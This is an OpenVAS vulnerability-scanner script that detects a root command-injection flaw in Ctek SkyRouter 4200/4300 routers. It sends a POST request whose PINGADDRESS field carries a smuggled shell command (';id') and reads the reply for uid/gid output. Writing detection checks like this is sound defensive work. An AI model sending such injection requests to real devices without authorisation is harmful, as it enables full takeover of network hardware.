###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ctek_skyrouter_50867.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Ctek SkyRouter 4200 and 4300 Series Routers Remote Arbitrary Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103479");
  script_bugtraq_id(50867);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13659 $");
  script_cve_id("CVE-2011-5010");

  script_name("Ctek SkyRouter 4200 and 4300 Series Routers Remote Arbitrary Command Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50867");
  script_xref(name:"URL", value:"http://www.ctekproducts.com/");

  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-04-25 15:07:13 +0200 (Wed, 25 Apr 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"Ctek SkyRouter 4200 and 4300 series routers are prone to a remote
arbitrary command-execution vulnerability because it fails to
adequately sanitize user-supplied input.");

  script_tag(name:"impact", value:"Remote attackers can exploit this issue to execute arbitrary shell
commands with superuser privileges, which may facilitate a complete
compromise of the affected device.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

req = http_get(item:"/apps/a3/cfg_ethping.cgi", port:port);
res = http_send_recv(port:port, data:req);

if("Ctek" >!< res && "SkyRouter" >!< res)exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

req = string("POST /apps/a3/cfg_ethping.cgi HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 63\r\n",
             "\r\n",
             "MYLINK=%2Fapps%2Fa3%2Fcfg_ethping.cgi&CMD=u&PINGADDRESS=;id+%26");
res = http_send_recv(port:port, data:req);

if(egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) {
  security_message(port:port);
  exit(0);
}

exit(0);
